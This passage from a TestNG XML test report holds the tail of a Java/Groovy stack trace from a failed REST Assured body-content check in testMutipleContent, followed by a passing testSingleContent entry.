at org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCallCurrent(CallSiteArray.java:52)
at org.codehaus.groovy.runtime.callsite.AbstractCallSite.callCurrent(AbstractCallSite.java:154)
at org.codehaus.groovy.runtime.callsite.AbstractCallSite.callCurrent(AbstractCallSite.java:166)
at io.restassured.internal.ResponseSpecificationImpl.content(ResponseSpecificationImpl.groovy:251)
at io.restassured.specification.ResponseSpecification$content$0.callCurrent(Unknown Source)
at org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCallCurrent(CallSiteArray.java:52)
at org.codehaus.groovy.runtime.callsite.AbstractCallSite.callCurrent(AbstractCallSite.java:154)
at org.codehaus.groovy.runtime.callsite.AbstractCallSite.callCurrent(AbstractCallSite.java:190)
at io.restassured.internal.ResponseSpecificationImpl.body(ResponseSpecificationImpl.groovy:234)
at io.restassured.internal.ValidatableResponseOptionsImpl.body(ValidatableResponseOptionsImpl.java:268)
at com.BDD.Tests.validateSingleandMultipleContents.testMutipleContent(validateSingleandMultipleContents.java:31)
at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
at java.base/java.lang.reflect.Method.invoke(Method.java:564)
at org.testng.internal.MethodInvocationHelper.invokeMethod(MethodInvocationHelper.java:133)
at org.testng.internal.TestInvoker.invokeMethod(TestInvoker.java:584)
at org.testng.internal.TestInvoker.invokeTestMethod(TestInvoker.java:172)
at org.testng.internal.MethodRunner.runInSequence(MethodRunner.java:46)
at org.testng.internal.TestInvoker$MethodInvocationAgent.invoke(TestInvoker.java:804)
at org.testng.internal.TestInvoker.invokeTestMethods(TestInvoker.java:145)
at org.testng.internal.TestMethodWorker.invokeTestMethods(TestMethodWorker.java:146)
at org.testng.internal.TestMethodWorker.run(TestMethodWorker.java:128)
at java.base/java.util.ArrayList.forEach(ArrayList.java:1378)
at org.testng.TestRunner.privateRun(TestRunner.java:770)
at org.testng.TestRunner.run(TestRunner.java:591)
at org.testng.SuiteRunner.runTest(SuiteRunner.java:402)
at org.testng.SuiteRunner.runSequentially(SuiteRunner.java:396)
at org.testng.SuiteRunner.privateRun(SuiteRunner.java:355)
at org.testng.SuiteRunner.run(SuiteRunner.java:304)
at org.testng.SuiteRunnerWorker.runSuite(SuiteRunnerWorker.java:53)
at org.testng.SuiteRunnerWorker.run(SuiteRunnerWorker.java:96)
at org.testng.TestNG.runSuitesSequentially(TestNG.java:1180)
at org.testng.TestNG.runSuitesLocally(TestNG.java:1102)
at org.testng.TestNG.runSuites(TestNG.java:1032)
at org.testng.TestNG.run(TestNG.java:1000)
at org.testng.remote.AbstractRemoteTestNG.run(AbstractRemoteTestNG.java:115)
at org.testng.remote.RemoteTestNG.initAndRun(RemoteTestNG.java:251)
at org.testng.remote.RemoteTestNG.main(RemoteTestNG.java:77)
]]>
    </failure>
  </testcase> <!-- testMutipleContent -->
  <testcase classname="com.BDD.Tests.validateSingleandMultipleContents" name="testSingleContent" time="2.666"/>
</testsuite> <!-- com.BDD.Tests.validateSingleandMultipleContents -->
